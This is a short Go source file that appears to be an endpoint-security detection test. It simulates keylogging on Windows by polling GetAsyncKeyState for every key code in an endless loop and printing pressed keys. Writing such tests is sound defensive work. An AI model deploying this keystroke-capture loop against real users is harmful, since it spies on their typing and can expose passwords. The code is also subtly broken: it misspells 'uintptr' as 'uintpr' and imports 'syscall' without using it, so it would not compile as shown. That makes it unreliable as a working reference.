//go:build windows
// +build windows

/*
ID: ef0a2322-641b-4127-8b48-2def55fe1f1f
NAME: GetAsyncKeyState API Call from Suspicious Process
CREATED: 2024-06-28
scenario: `GetAsyncKeyState` API call [function from `user32.dll`] to track keystrokes
*/

package main

import (
	_ "embed"
	"runtime"
	"syscall"
	"time"

	Endpoint "github.com/preludeorg/test/endpoint"
	"golang.org/x/sys/windows"
)

var user32 = windows.NewLazySystemDLL("user32.dll")
var procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")

func test() {
	println("[+] initiating GetAsyncKeyState API calls from suspicious process")

	for {
		for key := 0; key < 256; key++ {
			ret, _, _ := procGetAsyncKeyState.Call(uintpr(key))
			if ret != 0 {
				println("[+] key pressed:", key)
			}
		}
		time.Sleep(100 * time.Millisecond)
	}
}

func main() {
	if runtime.GOOS == "windows" {
		go test()
		Endpoint.Start(func() {})
	}
}